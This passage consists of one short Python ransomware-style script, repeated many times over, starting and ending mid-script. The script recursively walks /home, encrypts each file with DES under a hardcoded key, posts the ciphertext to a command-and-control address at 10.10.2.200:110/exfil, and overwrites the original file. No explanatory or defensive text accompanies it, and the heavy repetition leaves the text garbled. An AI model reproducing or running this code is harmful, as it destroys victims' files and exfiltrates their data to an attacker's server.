            encrypt_file(path.join(start_dir, f))

def main():
    encrypt()

if __name__ == "__main__":
    exit(main())
#!/usr/bin/env pyrhon3

import inspect
import requests
import sys
from os import listdir, path
from Crypto.Cipher import DES
from Crypto.Util.Padding import pad

C2 = "http://10.10.2.200:110"
KEY = b"11111111"
DES = DES.new(KEY, DES.MODE_ECB)
BLOCK_SIZE=64

def encrypt_file(filepath):
    print(filepath)
    with open(filepath) as f:
        try:
            padded_text = pad(f.read().encode('UTF-8'), BLOCK_SIZE)
            encrypted_text = DES.encrypt(padded_text)
            r = requests.post(C2+"/exfil", data=encrypted_text)
            with open(filepath, "wb") as w:
                w.write(encrypted_text)
        except Exception as e:
            print(e)
            

def encrypt(start_dir="/home"):
    for f in listdir(start_dir):
        if path.isdir(path.join(start_dir, f)):
            encrypt(path.join(start_dir, f))
        elif path.isfile(path.join(start_dir, f)):
            encrypt_file(path.join(start_dir, f))

def main():
    encrypt()

if __name__ == "__main__":
    exit(main())
#!/usr/bin/env pyrhon3

import inspect
import requests
import sys
from os import listdir, path
from Crypto.Cipher import DES
from Crypto.Util.Padding import pad

C2 = "http://10.10.2.200:110"
KEY = b"11111111"
DES = DES.new(KEY, DES.MODE_ECB)
BLOCK_SIZE=64

def encrypt_file(filepath):
    print(filepath)
    with open(filepath) as f:
        try:
            padded_text = pad(f.read().encode('UTF-8'), BLOCK_SIZE)
            encrypted_text = DES.encrypt(padded_text)
            r = requests.post(C2+"/exfil", data=encrypted_text)
            with open(filepath, "wb") as w:
                w.write(encrypted_text)
        except Exception as e:
            print(e)
            

def encrypt(start_dir="/home"):
    for f in listdir(start_dir):
        if path.isdir(path.join(start_dir, f)):
            encrypt(path.join(start_dir, f))
        elif path.isfile(path.join(start_dir, f)):
            encrypt_file(path.join(start_dir, f))

def main():
    encrypt()

if __name__ == "__main__":
    exit(main())
#!/usr/bin/env pyrhon3

import inspect
import requests
import sys
from os import listdir, path
from Crypto.Cipher import DES
from Crypto.Util.Padding import pad

C2 = "http://10.10.2.200:110"
KEY = b"11111111"
DES = DES.new(KEY, DES.MODE_ECB)
BLOCK_SIZE=64

def encrypt_file(filepath):
    print(filepath)
    with open(filepath) as f:
        try:
            padded_text = pad(f.read().encode('UTF-8'), BLOCK_SIZE)
            encrypted_text = DES.encrypt(padded_text)
            r = requests.post(C2+"/exfil", data=encrypted_text)
            with open(filepath, "wb") as w:
                w.write(encrypted_text)
        except Exception as e:
            print(e)
            

def encrypt(start_dir="/home"):
    for f in listdir(start_dir):
        if path.isdir(path.join(start_dir, f)):
            encrypt(path.join(start_dir, f))
        elif path.isfile(path.join(start_dir, f)):
            encrypt_file(path.join(start_dir, f))

def main():
    encrypt()

if __name__ == "__main__":
    exit(main())
#!/usr/bin/env pyrhon3

import inspect
import requests
import sys
from os import listdir, path
from Crypto.Cipher import DES
from Crypto.Util.Padding import pad

C2 = "http://10.10.2.200:110"
KEY = b"11111111"
DES = DES.new(KEY, DES.MODE_ECB)
BLOCK_SIZE=64

def encrypt_file(filepath):
    print(filepath)
    with open(filepath) as f:
        try:
            padded_text = pad(f.read().encode('UTF-8'), BLOCK_SIZE)
            encrypted_text = DES.encrypt(padded_text)
            r = requests.post(C2+"/exfil", data=encrypted_text)
            with open(filepath, "wb") as w:
                w.write(encrypted_text)
        except Exception as e:
            print(e)
            

def encrypt(start_dir="/home"):
    for f in listdir(start_dir):
        if path.isdir(path.join(start_dir, f)):
            encrypt(path.join(start_dir, f))
        elif path.isfile(path.join(start_dir, f)):
            encrypt_file(path.join(start_dir, f))

def main():
    encrypt()

if __name__ == "__main__":
    exit(main())
#!/usr/bin/env pyrhon3

import inspect
import requests
import sys
from os import listdir, path
from Crypto.Cipher import DES
from Crypto.Util.Padding import pad

C2 = "http://10.10.2.200:110"
KEY = b"11111111"
DES = DES.new(KEY, DES.MODE_ECB)
BLOCK_SIZE=64

def encrypt_file(filepath):
    print(filepath)
    with open(filepath) as f:
        try:
            padded_text = pad(f.read().encode('UTF-8'), BLOCK_SIZE)
            encrypted_text = DES.encrypt(padded_text)
            r = requests.post(C2+"/exfil", data=encrypted_text)
            with open(filepath, "wb") as w:
                w.write(encrypted_text)
        except Exception as e:
            print(e)
            

def encrypt(start_dir="/home"):
    for f in listdir(start_dir):
        if path.isdir(path.join(start_dir, f)):
            encrypt(path.join(start_dir, f))
        elif path.isfile(path.join(start_dir, f)):
            encrypt_file(path.join(start_dir, f))

def main():
    encrypt()

if __name__ == "__main__":
    exit(main())
#!/usr/bin/env pyrhon3

import inspect
import requests
import sys
from os import listdir, path
from Crypto.Cipher import DES
from Crypto.Util.Padding import pad

C2 = "http://10.10.2.200:110"
KEY = b"11111111"
DES = DES.new(KEY, DES.MODE_ECB)
BLOCK_SIZE=64

def encrypt_file(filepath):
    print(filepath)
    with open(filepath) as f:
        try:
            padded_text = pad(f.read().encode('UTF-8'), BLOCK_SIZE)
            encrypted_text = DES.encrypt(padded_text)
            r = requests.post(C2+"/exfil", data=encrypted_text)
            with open(filepath, "wb") as w:
                w.write(encrypted_text)
        except Exception as e:
            print(e)
            

def encrypt(start_dir="/home"):
    for f in listdir(start_dir):
        if path.isdir(path.join(start_dir, f)):
            encrypt(path.join(start_dir, f))
        elif path.isfile(path.join(start_dir, f)):
            encrypt_file(path.join(start_dir, f))

def main():
    encrypt()

if __name__ == "__main__":
    exit(main())
#!/usr/bin/env pyrhon3

import inspect
import requests
import sys
from os import listdir, path
from Crypto.Cipher import DES
from Crypto.Util.Padding import pad

C2 = "http://10.10.2.200:110"
KEY = b"11111111"
DES = DES.new(KEY, DES.MODE_ECB)
BLOCK_SIZE=64

def encrypt_file(filepath):
    print(filepath)
    with open(filepath) as f:
        try:
            padded_text = pad(f.read().encode('UTF-8'), BLOCK_SIZE)
            encrypted_text = DES.encrypt(padded_text)
            r = requests.post(C2+"/exfil", data=encrypted_text)
            with open(filepath, "wb") as w:
                w.write(encrypted_text)
        except Exception as e:
            print(e)
            

def encrypt(start_dir="/home"):
    for f in listdir(start_dir):
        if path.isdir(path.join(start_dir, f)):
            encrypt(path.join(start_dir, f))
        elif path.isfile(path.join(start_dir, f)):
            encrypt_file(path.join(start_dir, f))

def main():
    encrypt()

if __name__ == "__main__":
    exit(main())
#!/usr/bin/env pyrhon3

import inspect
import requests
import sys
from os import listdir, path
from Crypto.Cipher import DES
from Crypto.Util.Padding import pad

C2 = "http://10.10.2.200:110"
KEY = b"11111111"
DES = DES.new(KEY, DES.MODE_ECB)
BLOCK_SIZE=64

def encrypt_file(filepath):
    print(filepath)
    with open(filepath) as f:
        try:
            padded_text = pad(f.read().encode('UTF-8'), BLOCK_SIZE)
            encrypted_text = DES.encrypt(padded_text)
            r = requests.post(C2+"/exfil", data=encrypted_text)
            with open(filepath, "wb") as w:
                w.write(encrypted_text)
        except Exception as e:
            print(e)
            

def encrypt(start_dir="/home"):
    for f in listdir(start_dir):
        if path.isdir(path.join(start_dir, f)):
            encrypt(path.join(start_dir, f))
        elif path.isfile(path.join(start_dir, f)):
            encrypt_file(path.join(start_dir, f))

def main():
    encrypt()

if __name__ == "__main__":
    exit(main())
#!/usr/bin/env pyrhon3

import inspect
import requests
import sys
from os import listdir, path
from Crypto.Cipher import DES
from Crypto.Util.Padding import pad

C2 = "http://10.10.2.200:110"
KEY = b"11111111"
DES = DES.new(KEY, DES.MODE_ECB)
BLOCK_SIZE=64

def encrypt_file(filepath):
    print(filepath)
    with open(filepath) as f:
        try:
            padded_text = pad(f.read().encode('UTF-8'), BLOCK_SIZE)
            encrypted_text = DES.encrypt(padded_text)
            r = requests.post(C2+"/exfil", data=encrypted_text)
            with open(filepath, "wb") as w:
                w.write(encrypted_text)
        except Exception as e:
            print(e)
            

def encrypt(start_dir="/home"):
    for f in listdir(start_dir):
        if path.isdir(path.join(start_dir, f)):
            encrypt(path.join(start_dir, f))
        elif path.isfile(path.join(start_dir, f)):
            encrypt_file(path.join(start_dir, f))

def main():
    encrypt()

if __name__ == "__main__":
    exit(main())
#!/usr/bin/env pyrhon3

import inspect
import requests
import sys
from os import listdir, path
from Crypto.Cipher import DES
from Crypto.Util.Padding import pad

C2 = "http://10.10.2.200:110"
KEY = b"11111111"
DES = DES.new(KEY, DES.MODE_ECB)
BLOCK_SIZE=64

def encrypt_file(filepath):
    print(filepath)
    with open(filepath) as f:
        try:
            padded_text = pad(f.read().encode('UTF-8'), BLOCK_SIZE)
            encrypted_text = DES.encrypt(padded_text)
            r = requests.post(C2+"/exfil", data=encrypted_text)
            with open(filepath, "wb") as w:
                w.write(encrypted_text)
        except Exception as e:
            print(e)
            

def encrypt(start_dir="/home"):
    for f in listdir(start_dir):
        if path.isdir(path.join(start_dir, f)):
            encrypt(path.join(start_dir, f))
        elif path.isfile(path.join(start_dir, f)):
            encrypt_file(path.join(start_dir, f))

def main():
    encrypt()

if __name__ == "__main__":
    exit(main())
#!/usr/bin/env pyrhon3

import inspect
import requests
import sys
from os import listdir, path
from Crypto.Cipher import DES
from Crypto.Util.Padding import pad

C2 = "http://10.10.2.200:110"
KEY = b"11111111"
DES = DES.new(KEY, DES.MODE_ECB)
BLOCK_SIZE=64

def encrypt_file(filepath):
    print(filepath)
    with open(filepath) as f:
        try:
            padded_text = pad(f.read().encode('UTF-8'), BLOCK_SIZE)
            encrypted_text = DES.encrypt(padded_text)
            r = requests.post(C2+"/exfil", data=encrypted_text)
            with open(filepath, "wb") as w:
                w.write(encrypted_text)
        except Exception as e:
            print(e)
            

def encrypt(start_dir="/home"):
    for f in listdir(start_dir):
        if path.isdir(path.join(start_dir, f)):
            encrypt(path.join(start_dir, f))
        elif path.isfile(path.join(start_dir, f)):
            encrypt_file(path.join(start_dir, f))

def main():
    encrypt()

if __name__ == "__main__":
    exit(main())
#!/usr/bin/env pyrhon3

import inspect
import requests
import sys
from os import listdir, path
from Crypto.Cipher import DES
from Crypto.Util.Padding import pad

C2 = "http://10.10.2.200:110"
KEY = b"11111111"
DES = DES.new(KEY, DES.MODE_ECB)
BLOCK_SIZE=64

def encrypt_file(filepath):
    print(filepath)
    with open(filepath) as f:
        try:
            padded_text = pad(f.read().encode('UTF-8'), BLOCK_SIZE)
            encrypted_text = DES.encrypt(padded_text)
            r = requests.post(C2+"/exfil", data=encrypted_text)
            with open(filepath, "wb") as w:
                w.write(encrypted_text)
        except Exception as e:
            print(e)
            

def encrypt(start_dir="/home"):
    for f in listdir(start_dir):
        if path.isdir(path.join(start_dir, f)):
            encrypt(path.join(start_dir, f))
        elif path.isfile(path.join(start_dir, f)):
            encrypt_file(path.join(start_dir, f))

def main():
    encrypt()

if __name__ == "__main__":
    exit(main())
#!/usr/bin/env pyrhon3

import inspect
import requests
import sys
from os import listdir, path
from Crypto.Cipher import DES
from Crypto.Util.Padding import pad

C2 = "http://10.10.2.200:110"
KEY = b"11111111"
DES = DES.new(KEY, DES.MODE_ECB)
BLOCK_SIZE=64

def encrypt_file(filepath):
    print(filepath)
    with open(filepath) as f:
        try:
            padded_text = pad(f.read().encode('UTF-8'), BLOCK_SIZE)
            encrypted_text = DES.encrypt(padded_text)
            r = requests.post(C2+"/exfil", data=encrypted_text)
            with open(filepath, "wb") as w:
                w.write(encrypted_text)
        except Exception as e:
            print(e)
            

def encrypt(start_dir="/home"):
    for f in listdir(start_dir):
        if path.isdir(path.join(start_dir, f)):
            encrypt(path.join(start_dir, f))
        elif path.isfile(path.join(start_dir, f)):
            encrypt_file(path.join(start_dir, f))

def main():
    encrypt()

if __name__ == "__main__":
    exit(main())
#!/usr/bin/env pyrhon3

import inspect
import requests
import sys
from os import listdir, path
from Crypto.Cipher import DES
from Crypto.Util.Padding import pad

C2 = "http://10.10.2.200:110"
KEY = b"11111111"
DES = DES.new(KEY, DES.MODE_ECB)
BLOCK_SIZE=64

def encrypt_file(filepath):
    print(filepath)
    with open(filepath) as f:
        try:
            padded_text = pad(f.read().encode('UTF-8'), BLOCK_SIZE)
            encrypted_text = DES.encrypt(padded_text)
            r = requests.post(C2+"/exfil", data=encrypted_text)
            with open(filepath, "wb") as w:
                w.write(encrypted_text)
        except Exception as e:
            print(e)
            

def encrypt(start_dir="/home"):
    for f in listdir(start_dir):
        if path.isdir(path.join(start_dir, f)):
            encrypt(path.join(start_dir, f))
        elif path.isfile(path.join(start_dir, f)):
            encrypt_file(path.join(start_dir, f))

def main():
    encrypt()

if __name__ == "__main__":
    exit(main())
#!/usr/bin/env pyrhon3

import inspect
import requests
import sys
from os import listdir, path
from Crypto.Cipher import DES
from Crypto.Util.Padding import pad

C2 = "http://10.10.2.200:110"
KEY = b"11111111"
DES = DES.new(KEY, DES.MODE_ECB)
BLOCK_SIZE=64

def encrypt_file(filepath):
    print(filepath)
    with open(filepath) as f:
        try:
            padded_text = pad(f.read().encode('UTF-8'), BLOCK_SIZE)
            encrypted_text = DES.encrypt(padded_text)
            r = requests.post(C2+"/exfil", data=encrypted_text)
            with open(filepath, "wb") as w:
                w.write(encrypted_text)
        except Exception as e:
            print(e)
            

def encrypt(start_dir="/home"):
    for f in listdir(start_dir):
        if path.isdir(path.join(start_dir, f)):
            encrypt(path.join(start_dir, f))
        elif path.isfile(path.join(start_dir, f)):
            encrypt_file(path.join(start_dir, f))

def main():
    encrypt()

if __name__ == "__main__":
    exit(main())
#!/usr/bin/env pyrhon3

import inspect
import requests
import sys
from os import listdir, path
from Crypto.Cipher import DES
from Crypto.Util.Padding import pad

C2 = "http://10.10.2.200:110"
KEY = b"11111111"
DES = DES.new(KEY, DES.MODE_ECB)
BLOCK_SIZE=64

def encrypt_file(filepath):
    print(filepath)
    with open(filepath) as f:
        try:
            padded_text = pad(f.read().encode('UTF-8'), BLOCK_SIZE)
            encrypted_text = DES.encrypt(padded_text)
            r = requests.post(C2+"/exfil", data=encrypted_text)
            with open(filepath, "wb") as w:
                w.write(encrypted_text)
        except Exception as e:
            print(e)
            

def encrypt(start_dir="/home"):
    for f in listdir(start_dir):
        if path.isdir(path.join(start_dir, f)):
            encrypt(path.join(start_dir, f))
        elif path.isfile(path.join(start_dir, f)):
            encrypt_file(path.join(start_dir, f))

def main():
    encrypt()

if __name__ == "__main__":
    exit(main())
#!/usr/bin/env pyrhon3

import inspect
import requests
import sys
from os import listdir, path
from Crypto.Cipher import DES
from Crypto.Util.Padding import pad

C2 = "http://10.10.2.200:110"
KEY = b"11111111"
DES = DES.new(KEY, DES.MODE_ECB)
BLOCK_SIZE=64

def encrypt_file(filepath):
    print(filepath)
    with open(filepath) as f:
        try:
            padded_text = pad(f.read().encode('UTF-8'), BLOCK_SIZE)
            encrypted_text = DES.encrypt(padded_text)
            r = requests.post(C2+"/exfil", data=encrypted_text)
            with open(filepath, "wb") as w:
                w.write(encrypted_text)
        except Exception as e:
            print(e)
            

def encrypt(start_dir="/home"):
    for f in listdir(start_dir):
        if path.isdir(path.join(start_dir, f)):
            encrypt(path.join(start_dir, f))
        elif path.isfile(path.join(start_dir, f)):
            encrypt_file(path.join(start_dir, f))

def main():
    encrypt()

if __name__ == "__main__":
    exit(main())
#!/usr/bin/env pyrhon3

import inspect
import requests
import sys
from os import listdir, path
from Crypto.Cipher import DES
from Crypto.Util.Padding import pad

C2 = "http://10.10.2.200:110"
KEY = b"11111111"
DES = DES.new(KEY, DES.MODE_ECB)
BLOCK_SIZE=64

def encrypt_file(filepath):
    print(filepath)
    with open(filepath) as f:
        try:
            padded_text = pad(f.read().encode('UTF-8'), BLOCK_SIZE)
            encrypted_text = DES.encrypt(padded_text)
            r = requests.post(C2+"/exfil", data=encrypted_text)
            with open(filepath, "wb") as w:
                w.write(encrypted_text)
        except Exception as e:
            print(e)
            

def encrypt(start_dir="/home"):
    for f in listdir(start_dir):
        if path.isdir(path.join(start_dir, f)):
            encrypt(path.join(start_dir, f))
        elif path.isfile(path.join(start_dir, f)):
            encrypt_file(path.join(start_dir, f))

def main():
    encrypt()

if __name__ == "__main__":
    exit(main())
#!/usr/bin/env pyrhon3

import inspect
import requests
import sys
from os import listdir, path
from Crypto.Cipher import DES
from Crypto.Util.Padding import pad

C2 = "http://10.10.2.200:110"
KEY = b"11111111"
DES = DES.new(KEY, DES.MODE_ECB)
BLOCK_SIZE=64

def encrypt_file(filepath):
    print(filepath)
    with open(filepath) as f:
        try:
            padded_text = pad(f.read().encode('UTF-8'), BLOCK_SIZE)
            encrypted_text = DES.encrypt(padded_text)
            r = requests.post(C2+"/exfil", data=encrypted_text)
            with open(filepath, "wb") as w:
                w.write(encrypted_text)
        except Exception as e:
            print(e)
            

def encrypt(start_dir="/home"):
    for f in listdir(start_dir):
        if path.isdir(path.join(start_dir, f)):
            encrypt(path.join(start_dir, f))
        elif path.isfile(path.join(start_dir, f)):
            encrypt_file(path.join(start_dir, f))

def main():
    encrypt()

if __name__ == "__main__":
    exit(main())
#!/usr/bin/env pyrhon3

import inspect
import requests
import sys
from os import listdir, path
from Crypto.Cipher import DES
from Crypto.Util.Padding import pad

C2 = "http://10.10.2.200:110"
KEY = b"11111111"
DES = DES.new(KEY, DES.MODE_ECB)
BLOCK_SIZE=64

def encrypt_file(filepath):
    print(filepath)
    with open(filepath) as f:
        try:
            padded_text = pad(f.read().encode('UTF-8'), BLOCK_SIZE)
            encrypted_text = DES.encrypt(padded_text)
            r = requests.post(C2+"/exfil", data=encrypted_text)
            with open(filepath, "wb") as w:
                w.write(encrypted_text)
        except Exception as e:
            print(e)
            

def encrypt(start_dir="/home"):
    for f in listdir(start_dir):
        if path.isdir(path.join(start_dir, f)):
            encrypt(path.join(start_dir, f))
        elif path.isfile(path.join(start_dir, f)):
            encrypt_file(path.join(start_dir, f))

def main():
    encrypt()

if __name__ == "__main__":
    exit(main())
#!/usr/bin/env pyrhon3

import inspect
import requests
import sys
from os import listdir, path
from Crypto.Cipher import DES
from Crypto.Util.Padding import pad

C2 = "http://10.10.2.200:110"
KEY = b"11111111"
DES = DES.new(KEY, DES.MODE_ECB)
BLOCK_SIZE=64

def encrypt_file(filepath):
    print(filepath)
    with open(filepath) as f:
        try:
            padded_text = pad(f.read().encode('UTF-8'), BLOCK_SIZE)
            encrypted_text = DES.encrypt(padded_text)
            r = requests.post(C2+"/exfil", data=encrypted_text)
            with open(filepath, "wb") as w:
                w.write(encrypted_text)
        except Exception as e:
            print(e)
            

def encrypt(start_dir="/home"):
    for f in listdir(start_dir):
        if path.isdir(path.join(start_dir, f)):
            encrypt(path.join(start_dir, f))
        elif path.isfile(path.join(start_dir, f)):
            encrypt_file(path.join(start_dir, f))

def main():
    encrypt()

if __name__ == "__main__":
    exit(main())
#!/usr/bin/env pyrhon3

import inspect
import requests
import sys
from os import listdir, path
from Crypto.Cipher import DES
from Crypto.Util.Padding import pad

C2 = "http://10.10.2.200:110"
KEY = b"11111111"
DES = DES.new(KEY, DES.MODE_ECB)
BLOCK_SIZE=64

def encrypt_file(filepath):
    print(filepath)
    with open(filepath) as f:
        try:
            padded_text = pad(f.read().encode('UTF-8'), BLOCK_SIZE)
            encrypted_text = DES.encrypt(padded_text)
            r = requests.post(C2+"/exfil", data=encrypted_text)
            with open(filepath, "wb") as w:
                w.write(encrypted_text)
        except Exception as e:
            print(e)
            

def encrypt(start_dir="/home"):
    for f in listdir(start_dir):
        if path.isdir(path.join(start_dir, f)):
            encrypt(path.join(start_dir, f))
        elif path.isfile(path.join(start_dir, f)):
            encrypt_file(path.join(start_dir, f))

def main():
    encrypt()

if __name__ == "__main__":
    exit(main())
#!/usr/bin/env pyrhon3

import inspect
import requests
import sys
from os import listdir, path
from Crypto.Cipher import DES
from Crypto.Util.Padding import pad

C2 = "http://10.10.2.200:110"
KEY = b"11111111"
DES = DES.new(KEY, DES.MODE_ECB)
BLOCK_SIZE=64

def encrypt_file(filepath):
    print(filepath)
    with open(filepath) as f:
        try:
            padded_text = pad(f.read().encode('UTF-8'), BLOCK_SIZE)
            encrypted_text = DES.encrypt(padded_text)
            r = requests.post(C2+"/exfil", data=encrypted_text)
            with open(filepath, "wb") as w:
                w.write(encrypted_text)
        except Exception as e:
            print(e)
            

def encrypt(start_dir="/home"):
    for f in listdir(start_dir):
        if path.isdir(path.join(start_dir, f)):
            encrypt(path.join(start_dir, f))
        elif path.isfile(path.join(start_dir, f)):
            encrypt_file(path.join(start_dir, f))

def main():
    encrypt()

if __name__ == "__main__":
    exit(main())
#!/usr/bin/env pyrhon3

import inspect
import requests
import sys
from os import listdir, path
from Crypto.Cipher import DES
from Crypto.Util.Padding import pad

C2 = "http://10.10.2.200:110"
KEY = b"11111111"
DES = DES.new(KEY, DES.MODE_ECB)
BLOCK_SIZE=64

def encrypt_file(filepath):
    print(filepath)
    with open(filepath) as f:
        try:
            padded_text = pad(f.read().encode('UTF-8'), BLOCK_SIZE)
            encrypted_text = DES.encrypt(padded_text)
            r = requests.post(C2+"/exfil", data=encrypted_text)
            with open(filepath, "wb") as w:
                w.write(encrypted_text)
        except Exception as e:
            print(e)
            

def encrypt(start_dir="/home"):
    for f in listdir(start_dir):
        if path.isdir(path.join(start_dir, f)):
            encrypt(path.join(start_dir, f))
        elif path.isfile(path.join(start_dir, f)):
            encrypt_file(path.join(start_dir, f))

def main():
    encrypt()

if __name__ == "__main__":
    exit(main())
#!/usr/bin/env pyrhon3

import inspect
import requests
import sys
from os import listdir, path
from Crypto.Cipher import DES
from Crypto.Util.Padding import pad

C2 = "http://10.10.2.200:110"
KEY = b"11111111"
DES = DES.new(KEY, DES.MODE_ECB)
BLOCK_SIZE=64

def encrypt_file(filepath):
    print(filepath)
    with open(filepath) as f:
        try:
            padded_text = pad(f.read().encode('UTF-8'), BLOCK_SIZE)
            encrypted_text = DES.encrypt(padded_text)
            r = requests.post(C2+"/exfil", data=encrypted_text)
            with open(filepath, "wb") as w:
                w.write(encrypted_text)
        except Exception as e:
            print(e)
            

def encrypt(start_dir="/home"):
    for f in listdir(start_dir):
        if path.isdir(path.join(start_dir, f)):
            encrypt(path.join(start_dir, f))
        elif path.isfile(path.join(start_dir, f)):
            encrypt_file(path.join(start_dir, f))

def main():
    encrypt()

if __name__ == "__main__":
    exit(main())
#!/usr/bin/env pyrhon3

import inspect
import requests
import sys
from os import listdir, path
from Crypto.Cipher import DES
from Crypto.Util.Padding import pad

C2 = "http://10.10.2.200:110"
KEY = b"11111111"
DES = DES.new(KEY, DES.MODE_ECB)
BLOCK_SIZE=64

def encrypt_file(filepath):
    print(filepath)
    with open(filepath) as f:
        try:
            padded_text = pad(f.read().encode('UTF-8'), BLOCK_SIZE)
            encrypted_text = DES.encrypt(padded_text)
            r = requests.post(C2+"/exfil", data=encrypted_text)
            with open(filepath, "wb") as w:
                w.write(encrypted_text)
        except Exception as e:
            print(e)
            

def encrypt(start_dir="/home"):
    for f in listdir(start_dir):
        if path.isdir(path.join(start_dir, f)):
            encrypt(path.join(start_dir, f))
        elif path.isfile(path.join(start_dir, f)):
            encrypt_file(path.join(start_dir, f))

def main():
    encrypt()

if __name__ == "__main__":
    exit(main())
#!/usr/bin/env pyrhon3

import inspect
import requests
import sys
from os import listdir, path
from Crypto.Cipher import DES
from Crypto.Util.Padding import pad

C2 = "http://10.10.2.200:110"
KEY = b"11111111"
DES = DES.new(KEY, DES.MODE_ECB)
BLOCK_SIZE=64

def encrypt_file(filepath):
    print(filepath)
    with open(filepath) as f:
        try:
            padded_text = pad(f.read().encode('UTF-8'), BLOCK_SIZE)
            encrypted_text = DES.encrypt(padded_text)
            r = requests.post(C2+"/exfil", data=encrypted_text)
            with open(filepath, "wb") as w:
                w.write(encrypted_text)
        except Exception as e:
            print(e)
            

def encrypt(start_dir="/home"):
    for f in listdir(start_dir):
        if path.isdir(path.join(start_dir, f)):
            encrypt(path.join(start_dir, f))
        elif path.isfile(path.join(start_dir, f)):
            encrypt_file(path.join(start_dir, f))

def main():
    encrypt()

if __name__ == "__main__":
    exit(main())
#!/usr/bin/env pyrhon3

import inspect
import requests
import sys
from os import listdir, path
from Crypto.Cipher import DES
from Crypto.Util.Padding import pad

C2 = "http://10.10.2.200:110"
KEY = b"11111111"
DES = DES.new(KEY, DES.MODE_ECB)
BLOCK_SIZE=64

def encrypt_file(filepath):
    print(filepath)
    with open(filepath) as f:
        try:
            padded_text = pad(f.read().encode('UTF-8'), BLOCK_SIZE)
            encrypted_text = DES.encrypt(padded_text)
            r = requests.post(C2+"/exfil", data=encrypted_text)
            with open(filepath, "wb") as w:
                w.write(encrypted_text)
        except Exception as e:
            print(e)
            

def encrypt(start_dir="/home"):
    for f in listdir(start_dir):
        if path.isdir(path.join(start_dir, f)):
            encrypt(path.join(start_dir, f))
        elif path.isfile(path.join(start_dir, f)):
            encrypt_file(path.join(start_dir, f))

def main():
    encrypt()

if __name__ == "__main__":
    exit(main())
#!/usr/bin/env pyrhon3

import inspect
import requests
import sys
from os import listdir, path
from Crypto.Cipher import DES
from Crypto.Util.Padding import pad

C2 = "http://10.10.2.200:110"
KEY = b"11111111"
DES = DES.new(KEY, DES.MODE_ECB)
BLOCK_SIZE=64

def encrypt_file(filepath):
    print(filepath)
    with open(filepath) as f:
        try:
            padded_text = pad(f.read().encode('UTF-8'), BLOCK_SIZE)
            encrypted_text = DES.encrypt(padded_text)
            r = requests.post(C2+"/exfil", data=encrypted_text)
            with open(filepath, "wb") as w:
                w.write(encrypted_text)
        except Exception as e:
            print(e)
            

def encrypt(start_dir="/home"):
    for f in listdir(start_dir):
        if path.isdir(path.join(start_dir, f)):
            encrypt(path.join(start_dir, f))
        elif path.isfile(path.join(start_dir, f)):
            encrypt_file(path.join(start_dir, f))

def main():
    encrypt()

if __name__ == "__main__":
    exit(main())
#!/usr/bin/env pyrhon3

import inspect
import requests
import sys
from os import listdir, path
from Crypto.Cipher import DES
from Crypto.Util.Padding import pad

C2 = "http://10.10.2.200:110"
KEY = b"11111111"
DES = DES.new(KEY, DES.MODE_ECB)
BLOCK_SIZE=64

def encrypt_file(filepath):
    print(filepath)
    with open(filepath) as f:
        try:
            padded_text = pad(f.read().encode('UTF-8'), BLOCK_SIZE)
            encrypted_text = DES.encrypt(padded_text)
            r = requests.post(C2+"/exfil", data=encrypted_text)
            with open(filepath, "wb") as w:
                w.write(encrypted_text)
        except Exception as e:
            print(e)
            

def encrypt(start_dir="/home"):
    for f in listdir(start_dir):
        if path.isdir(path.join(start_dir, f)):
            encrypt(path.join(start_dir, f))
        elif path.isfile(path.join(start_dir, f)):
            encrypt_file(path.join(start_dir, f))

def main():
    encrypt()

if __name__ == "__main__":
    exit(main())
#!/usr/bin/env pyrhon3

import inspect
import requests
import sys
from os import listdir, path
from Crypto.Cipher import DES
from Crypto.Util.Padding import pad

C2 = "http://10.10.2.200:110"
KEY = b"11111111"
DES = DES.new(KEY, DES.MODE_ECB)
BLOCK_SIZE=64

def encrypt_file(filepath):
    print(filepath)
    with open(filepath) as f:
        try:
            padded_text = pad(f.read().encode('UTF-8'), BLOCK_SIZE)
            encrypted_text = DES.encrypt(padded_text)
            r = requests.post(C2+"/exfil", data=encrypted_text)
            with open(filepath, "wb") as w:
                w.write(encrypted_text)
        except Exception as e:
            print(e)
            

def encrypt(start_dir="/home"):
    for f in listdir(start_dir):
        if path.isdir(path.join(start_dir, f)):
            encrypt(path.join(start_dir, f))
        elif path.isfile(path.join(start_dir, f)):
            encrypt_file(path.join(start_dir, f))

def main():
    encrypt()

if __name__ == "__main__":
    exit(main())
#!/usr/bin/env pyrhon3

import inspect
import requests
import sys
from os import listdir, path
from Crypto.Cipher import DES
from Crypto.Util.Padding import pad

C2 = "http://10.10.2.200:110"
KEY = b"11111111"
DES = DES.new(KEY, DES.MODE_ECB)
BLOCK_SIZE=64

def encrypt_file(filepath):
    print(filepath)
    with open(filepath) as f:
        try:
            padded_text = pad(f.read().encode('UTF-8'), BLOCK_SIZE)
            encrypted_text = DES.encrypt(padded_text)
            r = requests.post(C2+"/exfil", data=encrypted_text)
            with open(filepath, "wb") as w:
                w.write(encrypted_text)
        except Exception as e:
            print(e)
            

def encrypt(start_dir="/home"):
    for f in listdir(start_dir):
        if path.isdir(path.join(start_dir, f)):
            encrypt(path.join(start_dir, f))
        elif path.isfile(path.join(start_dir, f)):
            encrypt_file(path.join(start_dir, f))

def main():
    encrypt()

if __name__ == "__main__":
    exit(main())
#!/usr/bin/env pyrhon3

import inspect
import requests
import sys
from os import listdir, path
from Crypto.Cipher import DES
from Crypto.Util.Padding import pad

C2 = "http://10.10.2.200:110"
KEY = b"11111111"
DES = DES.new(KEY, DES.MODE_ECB)
BLOCK_SIZE=64

def encrypt_file(filepath):
    print(filepath)
    with open(filepath) as f:
        try:
            padded_text = pad(f.read().encode('UTF-8'), BLOCK_SIZE)
            encrypted_text = DES.encrypt(padded_text)
            r = requests.post(C2+"/exfil", data=encrypted_text)
            with open(filepath, "wb") as w:
                w.write(encrypted_text)
        except Exception as e:
            print(e)
            

def encrypt(start_dir="/home"):
    for f in listdir(start_dir):
        if path.isdir(path.join(start_dir, f)):
            encrypt(path.join(start_dir, f))
        elif path.isfile(path.join(start_dir, f)):
            encrypt_file(path.join(start_dir, f))

def main():
    encrypt()

if __name__ == "__main__":
    exit(main())
#!/usr/bin/env pyrhon3

import inspect
import requests
import sys
from os import listdir, path
from Crypto.Cipher import DES
from Crypto.Util.Padding import pad

C2 = "http://10.10.2.200:110"
KEY = b"11111111"
DES = DES.new(KEY, DES.MODE_ECB)
BLOCK_SIZE=64

def encrypt_file(filepath):
    print(filepath)
    with open(filepath) as f:
        try:
            padded_text = pad(f.read().encode('UTF-8'), BLOCK_SIZE)
            encrypted_text = DES.encrypt(padded_text)
            r = requests.post(C2+"/exfil", data=encrypted_text)
            with open(filepath, "wb") as w:
                w.write(encrypted_text)
        except Exception as e:
            print(e)
            

def encrypt(start_dir="/home"):
